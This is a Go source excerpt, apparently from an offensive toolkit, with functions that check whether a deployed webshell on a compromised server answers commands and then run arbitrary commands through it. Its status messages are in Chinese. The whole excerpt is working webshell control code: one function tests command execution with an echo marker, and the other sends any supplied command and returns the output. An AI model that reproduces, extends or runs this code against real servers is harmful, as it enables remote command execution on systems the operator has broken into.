// CheckShellAlive reports whether a deployed webshell answers commands.
func CheckShellAlive(ctx context.Context, c *DeepClient, shellURL string, payload ShellPayload) (bool, string) {
	if payload.Protocol == ShellProtocolV2 {
		return checkShellAliveV2(ctx, c, shellURL, payload)
	}
	marker := "jw_alive_" + strconv.FormatInt(time.Now().UnixNano(), 36)
	resp := c.Do(ctx, payload.ShellRequest(shellURL, WrapShellCommand(payload.Type, "echo "+marker)))
	if resp.Error != "" {
		return false, resp.Error
	}
	if resp.StatusCode >= 200 && resp.StatusCode < 400 {
		if strings.Contains(resp.Body, marker) {
			return true, "命令回显正常"
		}
		if strings.Contains(resp.Body, payload.Marker) {
			return true, "shell 可访问（未确认命令回显）"
		}
		return false, fmt.Sprintf("HTTP %d 响应中未见命令回显", resp.StatusCode)
	}
	return false, fmt.Sprintf("HTTP %d", resp.StatusCode)
}

// RunShellCommand runs one command through a webshell and returns its output.
func RunShellCommand(ctx context.Context, c *DeepClient, shellURL string, payload ShellPayload, command string) (string, error) {
	if strings.TrimSpace(command) == "" {
		return "", fmt.Errorf("命令不能为空")
	}
	if payload.Protocol == ShellProtocolV2 {
		return runShellCommandV2(ctx, c, shellURL, payload, command)
	}
	resp := c.Do(ctx, payload.ShellRequest(shellURL, WrapShellCommand(payload.Type, command)))
	if resp.Error != "" {
		return "", resp.transportErr()
	}
	if resp.StatusCode >= 400 {
		return resp.Body, fmt.Errorf("shell 返回 HTTP %d", resp.StatusCode)
	}
	return resp.Body, nil
}
